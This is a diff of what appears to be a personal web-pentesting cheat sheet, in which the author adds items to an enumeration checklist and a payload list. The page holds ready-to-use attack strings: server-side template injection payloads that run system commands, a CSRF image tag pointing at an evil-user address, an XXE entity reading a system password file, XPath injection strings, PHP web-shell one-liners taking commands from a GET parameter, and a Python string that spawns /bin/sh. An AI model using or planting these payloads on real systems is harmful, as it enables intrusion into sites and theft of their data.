@@ -29,7 +29,7 @@ toc_sticky: true
 <ul>
     <li>check website is it php,asp or html</li>
     <li>check source code does it use cms</li>
-    <li>Check robots.txt</li>
+    <li>Check robots.txt/sitemap.xml</li>
     <li>chech cert for useful info - subdomain?</li>
     <li>Gobuster dir and subdomain</li>
     <li>nikto</li>
@@ -39,7 +39,8 @@ toc_sticky: true
     <li>xxs?</li>
     <li>WIP</li>
     <li>SSRF</li>
-    <li>Server-side template injection - {{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}} or {{url_for.__globals__.os.popen("id").read() }}</li>
+    <li>Server-side template injection - {{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}} or {{url_for.__globals__.os.popen("id").read() }} or TPLMAP.py</li>
+    <li>CSRF - <.img src="https://vulnerable-website/email/change?email=pwned@evil-user.net"></li>
     <li>xml entities - <!DOCTYP3 test [
       <!ENTITY x SYSTEM "file:///etxc/paxswd">]></li>
       <li>xpath - hacker']%00 or hacker' or 1=1]%00 --- ?name=hacker' or 1=1]/parent::*/child::node()%00&password=sdf</li>
@@ -55,6 +56,8 @@ toc_sticky: true
 
 <h2>basic php oneliner</h2>
 <code>php system($requests['hyst']); ?></code>
+<code>?php system($_GET["cmd"]);?></code>
+<code>?php print exec('command'); ?></code>
 
 
 
@@ -145,6 +148,7 @@ toc_sticky: true
 
 </fieldset>
 
-
+<h2>lfi/rfi</h2>
+<p>https://raghavtalwar4.gitbook.io/privilege-escalation-cheatsheet/owasp-top-10-and-more/lfi-rfi-cheatsheet</p>
 g0tmilk
 asd__import__('os').system('/bin/sh')asd  
